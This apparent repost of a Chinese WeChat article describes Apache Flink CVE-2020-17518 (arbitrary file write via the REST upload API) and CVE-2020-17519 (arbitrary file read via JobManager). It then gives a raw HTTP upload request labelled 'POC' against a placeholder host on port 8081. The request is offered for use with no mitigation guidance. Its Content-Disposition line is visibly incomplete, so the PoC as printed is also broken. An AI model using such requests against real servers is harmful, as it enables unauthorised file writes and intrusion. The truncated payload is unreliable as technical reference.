> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-OFaYj_C_su7rT965qztVg)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1SDX2UByRxEBNEAniadkdnFib1CqWiaWpQBIabKp1JwtpEzrX6uOcdiazdhBu8ibNibkccBfrEdO3fULqQ/640?wx_fmt=png)

‍

CVE-2020-17518: 文件写入

攻击者利用 REST API，可以修改 HTTP 头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1 进程能访问到的）

CVE-2020-17519: 文件读取

Apache Flink 1.11.0 允许攻击者通过 JobManager 进程的 REST API 读取 JobManager 本地文件系统上的任何文件（JobManager 进程能访问到的）

POC：

```
POST /jars/upload HTTP/1.1
Host: IP:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 189

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; 

success
------WebKitFormBoundaryoZ8meKnrrso89R6Y--
```